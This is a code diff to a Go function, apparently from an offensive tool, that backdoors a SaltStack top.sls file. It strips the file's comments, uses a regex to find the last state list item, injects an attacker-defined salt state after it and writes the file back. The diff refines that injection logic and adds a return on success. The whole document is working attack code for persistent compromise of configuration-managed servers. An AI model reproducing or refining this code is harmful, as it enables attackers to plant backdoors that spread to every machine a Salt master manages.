@@ -90,8 +90,7 @@ func backdoorSiteSpecific(topLoc string) {
 }
 
 func backdoorSite(topLoc string) {
-	groupAllRun := regexp.MustCompile(`(?sm)^(\s+)-`)
-	//getAllStates := regexp.MustCompile(`(?sm)(^\w+)\:`)
+	groupLastItem := regexp.MustCompile(`(?sm)( {4}-)([a-zA-Z-_ :\n\r]*)$`)
 	comments := regexp.MustCompile(`#.*`)
 
 	fileContent, err := ioutil.ReadFile(topLoc)
@@ -102,15 +101,15 @@ func backdoorSite(topLoc string) {
 
 	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))
 
-	// Check if base: '*' exists
-	found := groupAllRun.MatchString(content)
+	found := groupLastItem.MatchString(content)
 	if found {
-		insertState := "$0 " + saltState + "\n$0"
-		content = fmt.Sprint(groupAllRun.ReplaceAllString(content, insertState))
+		insertState := "$1$2\n$1 " + saltState
+		content = fmt.Sprint(groupLastItem.ReplaceAllString(content, insertState))
 		err = ioutil.WriteFile(topLoc, []byte(content), 0644)
 		if err != nil {
 			log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
 		}
+		return
 	}
 
 	log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
